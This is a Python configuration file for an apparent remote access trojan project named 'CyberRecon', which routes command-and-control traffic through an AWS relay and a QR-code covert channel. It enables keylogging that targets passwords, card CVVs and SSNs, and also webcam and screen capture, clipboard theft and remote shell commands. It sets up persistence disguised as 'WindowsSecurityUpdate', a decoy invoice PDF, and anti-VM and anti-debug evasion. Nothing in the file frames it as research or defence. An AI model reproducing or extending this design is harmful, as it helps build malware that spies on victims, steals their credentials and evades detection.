"""
CyberRecon Configuration
Mandiant QR C2 Bypass - Full Project Configuration
"""

import os

# === C2 Server Configuration ===
C2_HOST = os.getenv("C2_HOST", "0.0.0.0")
C2_PORT = int(os.getenv("C2_PORT", "8443"))
C2_BASE_URL = f"https://{C2_HOST}:{C2_PORT}"

# === AWS Relay Configuration ===
AWS_RELAY_HOST = os.getenv("AWS_RELAY_HOST", "0.0.0.0")
AWS_RELAY_PORT = int(os.getenv("AWS_RELAY_PORT", "443"))
AWS_RELAY_C2_BACKEND = os.getenv("AWS_RELAY_C2_BACKEND", f"http://127.0.0.1:{C2_PORT}")

# === QR Channel Configuration ===
QR_REFRESH_INTERVAL = 5      # seconds (matches Mandiant ~5s latency)
QR_MAX_PAYLOAD = 438         # bytes/sec target per Mandiant paper
QR_IMAGE_SIZE = 400          # pixels
QR_ERROR_CORRECTION = "H"    # High error correction for reliability
QR_VERSION = None            # Auto-fit
QR_BORDER = 4

# === Multi-layer Fallback Chain ===
FALLBACK_CHAIN = ["tcp", "http", "qr"]
TCP_PORT = 4444
HTTP_PORT = 8080

# === RAT Capabilities ===
RAT_FEATURES = [
    "screenshot",
    "webcam_capture",
    "keylogger",
    "clipboard_steal",
    "file_download",
    "gps_location",
    "process_list",
    "system_info",
    "shell_command",
    "file_listing",
    "persist",
    "self_destruct"
]

# === Stealth Configuration ===
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
DECOY_DOC = "Invoice_2024.pdf"

# SFX password — must be set via env var. NEVER hardcode.
# Generate with: python -c "import secrets; print(secrets.token_urlsafe(24))"
SFX_PASSWORD = os.getenv("CYBERRECON_SFX_PASSWORD", "")
if not SFX_PASSWORD:
    import secrets as _secrets
    SFX_PASSWORD = _secrets.token_urlsafe(24)

# === Keylogger Configuration ===
KEYLOG_BUFFER_SIZE = 500
KEYLOG_FLUSH_INTERVAL = 30   # seconds
KEYLOG_SENSITIVE_WORDS = [
    "password", "credit", "cvv", "ssn", "login",
    "admin", "secret", "token", "api_key", "private_key"
]

# === Screenshot Configuration ===
SCREENSHOT_QUALITY = 85
SCREENSHOT_FORMAT = "JPEG"

# === Webcam Configuration ===
WEBCAM_QUALITY = 85
WEBCAM_CAMERA_INDEX = 0
WEBCAM_DETECT_FACES = False

# === Persistence Configuration ===
PERSISTENCE_METHODS = [
    "registry_run_key",
    "scheduled_task",
    "startup_folder",
    "wmi_event",
    "service"
]
PERSISTENCE_NAME = "WindowsSecurityUpdate"
PERSISTENCE_INTERVAL = 15    # minutes for scheduled task

# === Anti-VM / Anti-Debug ===
CHECK_DEBUGGER = True
CHECK_VM = True
VM_INDICATORS = ["vbox", "vmware", "virtualbox", "qemu", "xen", "hyper-v"]
VM_MAC_PREFIXES = ["080027", "000c29", "00155d", "525400"]

# === Logging ===
LOG_LEVEL = "INFO"
LOG_FILE = "cyberrecon.log"
